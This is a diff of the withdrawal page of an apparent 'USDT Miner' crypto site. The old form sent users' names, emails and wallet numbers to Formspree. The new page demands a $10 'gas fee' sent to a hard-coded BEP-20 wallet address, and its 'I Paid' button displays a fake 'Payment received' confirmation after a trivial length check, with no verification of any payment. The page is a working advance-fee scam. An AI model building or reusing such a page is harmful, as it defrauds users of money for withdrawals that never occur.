@@ -2,10 +2,8 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Withdraw - USDT Miner</title>
-  <meta name="theme-color" content="#22c55e" />
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Withdraw Request</title>
   <style>
     body {
       font-family: 'Poppins', sans-serif;
@@ -16,132 +14,113 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
-      padding: 20px;
+      height: 100vh;
     }
+
     .container {
-      background: rgba(0, 0, 0, 0.7);
-      backdrop-filter: blur(15px);
-      border-radius: 15px;
-      padding: 30px;
-      box-shadow: 0 0 30px rgba(255, 204, 0, 0.3);
-      max-width: 450px;
-      width: 100%;
+      background: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(12px);
+      border-radius: 12px;
+      padding: 30px 25px;
+      max-width: 400px;
+      width: 90%;
+      box-shadow: 0 0 25px rgba(255, 204, 0, 0.2);
       text-align: center;
     }
+
     h2 {
       color: #facc15;
       margin-bottom: 20px;
     }
-    label {
-      display: block;
-      margin: 15px 0 6px;
-      text-align: left;
-      color: #facc15;
-      font-weight: 600;
+
+    .info-box {
+      background-color: #1e293b;
+      padding: 15px;
+      border-radius: 10px;
+      font-size: 0.95em;
+      color: #e2e8f0;
+      margin-bottom: 20px;
+      line-height: 1.6;
     }
-    input, select {
+
+    input[type="text"] {
       width: 100%;
       padding: 10px;
-      border-radius: 8px;
+      margin-top: 15px;
+      margin-bottom: 15px;
       border: none;
-      background: #181818;
+      border-radius: 8px;
+      background: #0f172a;
       color: #fff;
       font-size: 1em;
-      box-sizing: border-box;
     }
+
     button {
-      margin-top: 25px;
-      background-color: #facc15;
+      background-color: #22c55e;
+      color: white;
       border: none;
-      padding: 12px 20px;
+      padding: 12px 0;
       border-radius: 8px;
-      color: #000;
-      font-weight: 600;
+      font-size: 1em;
+      font-weight: bold;
       cursor: pointer;
       width: 100%;
-      transition: background 0.3s ease;
+      transition: background 0.3s;
     }
+
     button:hover {
-      background-color: #ffcd00;
+      background-color: #16a34a;
     }
-    .success-message {
+
+    .success-msg {
       display: none;
-      color: #22c55e;
-      font-weight: 600;
       margin-top: 20px;
-      font-size: 1.1em;
+      padding: 12px;
+      background: #0d9488;
+      border-radius: 8px;
+      color: #fff;
+    }
+
+    .wallet-address {
+      font-weight: bold;
+      color: #facc15;
+      font-size: 0.95em;
+      word-break: break-all;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>Withdraw Funds</h2>
-    <form id="withdrawForm" action="https://formspree.io/f/mnqwdlnl" method="POST">
-      <label for="name">Full Name</label>
-      <input id="name" name="name" type="text" placeholder="Your full name" required />
+    <h2>Withdraw Request</h2>
+    <div class="info-box">
+      To process your withdrawal, a gas fee of <strong>$10</strong> is required.  
+      Please send it via <strong>BEP-20 (BNB Smart Chain)</strong> to the wallet address below:
+      <div class="wallet-address">
+        0xc903977a5d443c588cc52e893cdd9e5dc2df4d15
+      </div>
+    </div>
 
-      <label for="email">Email Address</label>
-      <input id="email" name="_replyto" type="email" placeholder="Your email" required />
+    <label for="txHash">Paste your transaction hash:</label>
+    <input type="text" id="txHash" placeholder="Transaction Hash (TXID)" />
 
-      <label for="amount">Withdrawal Amount (USDT)</label>
-      <input id="amount" name="amount" type="number" min="1" step="0.01" placeholder="Amount to withdraw" required />
+    <button onclick="handlePayment()">I Paid</button>
 
-      <label for="method">Payment Method</label>
-      <select id="method" name="method" required>
-        <option value="" disabled selected>Select method</option>
-        <optgroup label="Cryptocurrencies">
-          <option value="USDT">USDT (Tether)</option>
-          <option value="BTC">Bitcoin (BTC)</option>
-          <option value="ETH">Ethereum (ETH)</option>
-          <option value="LTC">Litecoin (LTC)</option>
-        </optgroup>
-        <optgroup label="E-Payment">
-          <option value="PayPal">PayPal</option>
-          <option value="Payoneer">Payoneer</option>
-          <option value="Easypaisa">Easypaisa</option>
-          <option value="JazzCash">JazzCash</option>
-        </optgroup>
-      </select>
-
-      <label for="wallet">Wallet/Account Number</label>
-      <input id="wallet" name="wallet" type="text" placeholder="Your wallet or account number" required />
-
-      <button type="submit">Submit Withdrawal</button>
-    </form>
-    <div class="success-message" id="successMessage">
-      Withdrawal request sent successfully! We will contact you soon.
+    <div id="success" class="success-msg">
+      ✅ Payment received! You will receive your withdrawal within 48 hours.
     </div>
   </div>
 
   <script>
-    const form = document.getElementById('withdrawForm');
-    const successMessage = document.getElementById('successMessage');
+    function handlePayment() {
+      const hash = document.getElementById('txHash').value.trim();
+      if (!hash || hash.length < 10) {
+        alert("Please enter a valid transaction hash.");
+        return;
+      }
 
-    form.addEventListener('submit', function(e) {
-      e.preventDefault(); // prevent default form submission
-
-      // Use Fetch API to send form data to Formspree
-      const data = new FormData(form);
-
-      fetch(form.action, {
-        method: 'POST',
-        body: data,
-        headers: {
-          'Accept': 'application/json'
-        }
-      }).then(response => {
-        if (response.ok) {
-          form.style.display = 'none';
-          successMessage.style.display = 'block';
-          form.reset();
-        } else {
-          alert('Oops! There was a problem submitting your form');
-        }
-      }).catch(error => {
-        alert('Oops! There was a problem submitting your form');
-      });
-    });
+      // Simulate submission
+      document.getElementById('success').style.display = 'block';
+    }
   </script>
 </body>
 </html>
